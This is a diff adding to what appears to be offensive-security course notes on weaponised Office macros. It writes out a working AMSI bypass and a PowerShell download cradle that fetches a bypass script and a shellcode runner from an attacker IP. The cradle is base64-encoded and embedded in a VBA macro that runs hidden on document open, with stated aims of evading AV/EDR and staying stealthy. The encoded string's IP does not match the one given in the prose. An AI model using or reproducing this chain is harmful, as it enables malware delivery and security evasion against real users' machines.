@@ -126,3 +126,57 @@ Sub AutoOpen()
 End Sub
 ```
 
+Using the Add-Type compilation, leaves so many artifacts behind, meaning that some AV/EDR could catch our malicious macro and stop its execution. Also another thing that we must take into account when
+executing PowerShell code thourgh IEX(Invoke-Expression) is AMSI. So we first must bypass AMSI and then execute our PowerShell malicious code. To bypass the AMSI in powershell you can take any of this [methods](https://github.com/trike33/PEN-300-Code-Snippets/tree/main/AMSI%20Bypasses/PowerShell). Altough I prefer this [one](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/AMSI%20Bypasses/PowerShell/AmsiContext.ps1) due to its simplicity. 
+
+This is how we would implement it in a real life scenario:
+
+```
+Amsi bypass(amsi.txt) file contents:
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+IEX(New-Object System.Net.WebClient).downloadString('http://192.168.1.1/run.ps1')
+
+The run.ps1 file is a powershell shellcode runner. Due to the complexity of this technique, we will base64 encode our PowerShell download cradle ass follows:
+~# pwsh
+❯ pwsh
+PowerShell 7.2.1
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+   A new PowerShell stable release is available: v7.3.4 
+   Upgrade now, or check out the release page at:       
+     https://aka.ms/PowerShell-Release?tag=v7.3.4       
+
+Welcome to Parrot OS 
+
+┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ $text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')"
+┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)                                   ┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ $EncodedText = [Convert]::ToBase64String($bytes)                                           ┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ $EncodedText                                                                              SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADUALwBhAG0AcwBpAC4AdAB4AHQAJwApAA==
+┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$
+
+Then we will embed the command to our macro:
+Sub MyMacro()
+  Dim str As String
+  str = "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADUALwBhAG0AcwBpAC4AdAB4AHQAJwApAA=="
+  Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+  MyMacro
+End Sub
+
+Sub AutoOpen()
+  MyMacro
+End Sub
+
+So if our attack was successful we must recieve first a request for the amsi.txt file and then, secondly a request for our run.ps1 file.
+```
+
+As previously mentioned the Add-Type compilation leaves many artifacts behind and those artifacts are written to disk. Since we want to be as stealthier as posible, we will use an in-memory powershell shellcode runner. Here is one: 
